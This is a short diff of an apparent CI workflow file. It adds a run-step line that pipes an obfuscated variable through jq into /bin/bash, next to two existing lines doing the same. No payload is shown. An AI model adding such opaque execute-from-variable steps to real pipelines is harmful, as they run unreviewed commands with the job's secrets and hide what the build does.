@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$agze808" | jq -r .mtpy3 | /bin/bash
           echo $th4758 | jq -r .nmqcg4282 | /bin/bash
+          printf '%s' "$xgin5" | jq -r .qo50 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
